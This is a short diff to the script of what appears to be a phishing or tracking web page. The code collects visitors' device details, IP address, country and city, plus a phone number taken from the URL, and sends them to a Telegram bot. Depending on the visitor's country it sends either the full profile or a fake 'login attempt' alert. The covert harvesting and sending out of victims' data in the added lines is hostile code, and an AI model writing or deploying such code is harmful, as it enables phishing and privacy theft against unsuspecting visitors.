@@ -97,8 +97,13 @@ console.log(getDeviceInfo());
         .then(res => res.json())
         .then(data => {
           info += "IP: " + data.ip + "\n";
+          info += "Страна: " + data.country + "\n";
           info += "Город: " + data.city + "\n";
-          sendToTelegram(info);
+if (data.country === "KZ") {
+        sendToTelegram(info);
+    } else {
+        sendToTelegram("Попытка входа " + data.country + " " + data.ip + "\n" + "Номер телефона: " + params.get("tel") + "\n" + "Невозможно подтвердить вход");
+    }
         })
         .catch(err => console.error("Ошибка:", err));
     }
@@ -198,5 +203,6 @@ console.log(getDeviceInfo());
 
 
 </html>
+
 
 
